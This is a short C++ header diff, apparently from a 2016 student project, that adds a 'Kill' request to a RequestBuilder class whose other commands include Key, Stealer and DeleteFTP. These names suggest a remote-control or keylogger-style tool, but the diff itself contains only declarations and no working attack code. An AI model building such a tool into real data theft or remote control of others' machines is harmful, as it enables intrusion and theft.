@@ -5,7 +5,7 @@
 // Login   <galibe_s@epitech.net>
 //
 // Started on  Sat Nov  5 15:53:35 2016 stephane galibert
-// Last update Tue Nov  8 18:03:16 2016 stephane galibert
+// Last update Thu Nov 10 11:51:59 2016 stephane galibert
 //
 
 #pragma once
@@ -25,6 +25,7 @@
 #include "Key.hpp"
 #include "Stealer.hpp"
 #include "DeleteFTP.hpp"
+#include "Kill.hpp"
 
 class RequestBuilder : private boost::noncopyable
 {
@@ -41,6 +42,7 @@ private:
   std::unique_ptr<IRequest> exit(void) const;
   std::unique_ptr<IRequest> stealer(void) const;
   std::unique_ptr<IRequest> deleteftp(void) const;
+  std::unique_ptr<IRequest> kill(void) const;
 
   std::unordered_map<int, Cmds> _cmds;
 };
